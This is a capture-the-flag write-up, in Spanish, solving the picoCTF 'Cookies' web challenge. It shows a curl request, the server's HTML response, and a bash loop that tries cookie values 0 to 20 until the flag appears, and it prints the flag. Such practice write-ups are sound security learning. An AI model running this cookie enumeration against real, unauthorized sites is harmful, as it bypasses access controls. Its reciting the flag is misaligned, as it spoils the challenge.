## Objetivo 
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)
## Solución  
```bash
kali@KaliEND:~/Downloads/PicoCTF$ curl http://mercury.picoctf.net:17781/check -H "Cookie: name=1"  
<!DOCTYPE html>  
<html lang="en">  
  
<head>  
   <title>Cookies</title>  
  
  
   <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">  
  
   <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">  
  
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>  
  
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>  
</head>  
  
<body>  
  
   <div class="container">  
       <div class="header">  
           <nav>  
               <ul class="nav nav-pills pull-right">  
                   <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>  
                   </li>  
               </ul>  
           </nav>  
           <h3 class="text-muted">Cookies</h3>  
       </div>  
          
       <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->  
          
          
       <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">  
         <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></but  
ton>  
         <!-- <strong>Title</strong> --> That is a cookie! Not very special though...  
           </div>  
        
        
        
       <div class="jumbotron">  
           <p class="lead"></p>  
           <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>  
       </div>  
  
  
       <footer class="footer">  
           <p>&copy; PicoCTF</p>  
       </footer>  
  
   </div>  
   <script>  
   $(document).ready(function(){  
       $(".close").click(function(){  
           $("myAlert").alert("close");  
       });  
   });  
   </script>  
</body>  
  
</html>

kali@KaliEND:~/Downloads/Pifor i in {0..20}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done |  
grep picoCTF  
           <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>  
kali@KaliEND:~/Downloads/PicoCTF$

```
## Notas Adicionales 
en el sitio web hay un campo para ingresar cookies, y si no es la cookie favorita se genera una cookie con un valor -1, si seguimos jugando con la cookie camiando los valores eventualmente encontrariamos la cookie, pero en este caso usamos la consola de comandos para automatizar el proceso usando un ciclo for desde 1 hasta 20 y ademas un grep para filtrar solamente los resultados deseados.
### Referencias

